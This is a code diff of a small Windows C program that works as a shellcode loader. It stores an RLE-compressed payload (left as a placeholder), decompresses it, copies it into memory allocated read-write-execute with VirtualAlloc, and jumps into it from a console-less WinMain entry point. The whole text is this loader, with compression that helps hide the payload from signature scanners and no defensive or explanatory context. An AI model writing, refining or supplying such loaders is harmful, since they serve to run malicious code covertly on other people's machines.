@@ -1,7 +1,8 @@
-__attribute__((section(".text")))
-unsigned char cmp[] = < /*shellcode*/>;
+#include <windows.h>
 
-const unsigned int CMP_SIZE = sizeof(cmp) - 1;
+unsigned char cmp[] = { /* <shellcode> */ };
+
+const unsigned int CMP_SIZE = sizeof(cmp);
 const unsigned int ORIG_SIZE = 324;
 
 void rle_decompress(const unsigned char* src, unsigned int src_len, unsigned char* dst, unsigned int dst_len) {
@@ -16,9 +17,12 @@ void rle_decompress(const unsigned char* src, unsigned int src_len, unsigned cha
     }
 }
 
-int main() {
-    static unsigned char buf[ORIG_SIZE];
+int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
+    unsigned char buf[ORIG_SIZE];
     rle_decompress(cmp, CMP_SIZE, buf, ORIG_SIZE);
-    (*(void(*)())(&buf))();
+    void *exec = VirtualAlloc(0, ORIG_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    unsigned char* dst = (unsigned char*)exec;
+    for (unsigned int i = 0; i < ORIG_SIZE; i++) dst[i] = buf[i];
+    ((void(*)())exec)();
     return 0;
 }
